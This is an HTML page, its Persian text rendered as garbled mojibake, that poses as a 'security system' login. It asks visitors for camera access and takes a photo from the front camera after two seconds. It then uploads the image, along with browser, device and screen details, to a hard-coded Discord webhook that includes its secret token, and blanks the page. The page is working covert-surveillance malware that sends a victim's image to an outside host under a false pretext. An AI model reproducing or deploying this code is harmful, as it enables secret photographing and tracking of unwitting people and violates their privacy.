<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø³ÛŒØ³ØªÙ… Ø§Ù…Ù†ÛŒØªÛŒ</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: black;
            color: white;
            font-family: Arial;
            text-align: center;
        }
        #loading {
            padding: 50px;
            font-size: 18px;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div id="loading">
        <div class="loader"></div>
        <p>Ø¯Ø± Ø­Ø§Ù„ Ø±Ø§Ù‡â€ŒØ§Ù†Ø¯Ø§Ø²ÛŒ Ø³ÛŒØ³ØªÙ…...</p>
    </div>

    <div id="cameraContainer" style="display:none;">
        <video id="video" autoplay playsinline style="width: 100%; height: 100vh; object-fit: cover;"></video>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>

    <script>
        // ğŸ”§ ÙˆØ¨â€ŒÙ‡ÙˆÚ© ØªÙˆ
        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1421586742120546418/sDyMZ53pfBPEzWRmmWG2ZlFtmmMDucEStM-pJ7V_q3l3wN4hmqQmBdp_kiqWVC06Sl9O';

        // Ø§Ù„Ù…Ù†Øªâ€ŒÙ‡Ø§
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const loading = document.getElementById('loading');
        const cameraContainer = document.getElementById('cameraContainer');

        // ÙˆÙ‚ØªÛŒ ØµÙØ­Ù‡ Ù„ÙˆØ¯ Ø´Ø¯
        window.onload = function() {
            setTimeout(() => {
                const confirm = window.confirm('âš ï¸ Ø¨Ø±Ø§ÛŒ ÙˆØ±ÙˆØ¯ Ø¨Ø§ÛŒØ¯ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¯Ø§Ø¯Ù‡ Ø´ÙˆØ¯\n\nØ¢ÛŒØ§ Ù…ÙˆØ§ÙÙ‚ Ù‡Ø³ØªÛŒØ¯ØŸ');
                
                if (confirm) {
                    startCamera();
                } else {
                    document.body.innerHTML = '<h1>âŒ Ø¯Ø³ØªØ±Ø³ÛŒ Ø±Ø¯ Ø´Ø¯</h1>';
                }
            }, 1000);
        };

        // Ø´Ø±ÙˆØ¹ Ø¯ÙˆØ±Ø¨ÛŒÙ†
        async function startCamera() {
            try {
                loading.innerHTML = '<div class="loader"></div><p>ğŸ“· Ø¯Ø± Ø­Ø§Ù„ ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ†...</p>';
                
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });

                video.srcObject = stream;
                loading.style.display = 'none';
                cameraContainer.style.display = 'block';

                // Ø¨Ø¹Ø¯ Ø§Ø² 2 Ø«Ø§Ù†ÛŒÙ‡ Ø¹Ú©Ø³ Ø¨Ú¯ÛŒØ±
                setTimeout(() => {
                    takePhoto(stream);
                }, 2000);

            } catch (error) {
                loading.innerHTML = '<h1>âŒ Ø®Ø·Ø§ Ø¯Ø± Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ†</h1><p>Ù„Ø·ÙØ§ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø±Ø§ Ø¨Ø±Ø±Ø³ÛŒ Ú©Ù†ÛŒØ¯</p>';
                console.error('Ø®Ø·Ø§:', error);
            }
        }

        // Ú¯Ø±ÙØªÙ† Ø¹Ú©Ø³
        async function takePhoto(stream) {
            try {
                loading.innerHTML = '<div class="loader"></div><p>ğŸ“¸ Ø¯Ø± Ø­Ø§Ù„ Ú¯Ø±ÙØªÙ† Ø¹Ú©Ø³...</p>';
                loading.style.display = 'block';
                cameraContainer.style.display = 'none';

                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0);
                
                // Ø¹Ú©Ø³ Ø±Ùˆ Ø¨Ù‡ ÙØ±Ù…Øª base64 ØªØ¨Ø¯ÛŒÙ„ Ú©Ù†
                const photoData = canvas.toDataURL('image/jpeg', 0.8);
                
                // Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø±Ùˆ Ø®Ø§Ù…ÙˆØ´ Ú©Ù†
                stream.getTracks().forEach(track => track.stop());
                
                // Ø¨Ù‡ Ø¯ÛŒØ³Ú©ÙˆØ±Ø¯ Ø¨ÙØ±Ø³Øª
                loading.innerHTML = '<div class="loader"></div><p>ğŸ”„ Ø¯Ø± Ø­Ø§Ù„ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ Ø¯ÛŒØ³Ú©ÙˆØ±Ø¯...</p>';
                await sendToDiscord(photoData);
                
                // ØµÙØ­Ù‡ Ø±Ùˆ Ø³ÙÛŒØ¯ Ú©Ù†
                document.body.style.background = 'white';
                document.body.innerHTML = '';
                
            } catch (error) {
                document.body.innerHTML = '<h1>âŒ Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³</h1>';
                console.error('Ø®Ø·Ø§:', error);
            }
        }

        // Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ Ø¯ÛŒØ³Ú©ÙˆØ±Ø¯
        async function sendToDiscord(photoData) {
            try {
                // ØªØ¨Ø¯ÛŒÙ„ Ø¹Ú©Ø³ Ø¨Ù‡ ÙØ§ÛŒÙ„
                const response = await fetch(photoData);
                const blob = await response.blob();
                
                // Ø§ÛŒØ¬Ø§Ø¯ ÙØ±Ù… Ø¯Ø§Ø¯Ù‡
                const formData = new FormData();
                formData.append('file', blob, 'security_photo.jpg');
                formData.append('payload_json', JSON.stringify({
                    username: 'Security Camera System',
                    avatar_url: 'https://cdn-icons-png.flaticon.com/512/2991/2991148.png',
                    content: 'ğŸ“¸ **Ø¹Ú©Ø³ Ø§Ù…Ù†ÛŒØªÛŒ Ø¯Ø±ÛŒØ§ÙØª Ø´Ø¯**\n' +
                            `ğŸ•’ **Ø²Ù…Ø§Ù†:** ${new Date().toLocaleString('fa-IR')}\n` +
                            `ğŸŒ **Ù…Ø±ÙˆØ±Ú¯Ø±:** ${navigator.userAgent.split(' ')[0]}\n` +
                            `ğŸ“± **Ø¯Ø³ØªÚ¯Ø§Ù‡:** ${/Mobile/.test(navigator.userAgent) ? 'Ù…ÙˆØ¨Ø§ÛŒÙ„' : 'Ø¯Ø³Ú©ØªØ§Ù¾'}\n` +
                            `ğŸ“ **ØµÙØ­Ù‡:** ${screen.width}x${screen.height}\n` +
                            'ğŸ”’ **Ø³ÛŒØ³ØªÙ… Ø§Ù…Ù†ÛŒØªÛŒ ÙØ¹Ø§Ù„**'
                }));

                // Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ Ø¯ÛŒØ³Ú©ÙˆØ±Ø¯
                const result = await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    body: formData
                });

                if (!result.ok) {
                    throw new Error('Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„');
                }

            } catch (error) {
                console.error('Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ Ø¯ÛŒØ³Ú©ÙˆØ±Ø¯:', error);
                throw error;
            }
        }
    </script>
</body>
</html>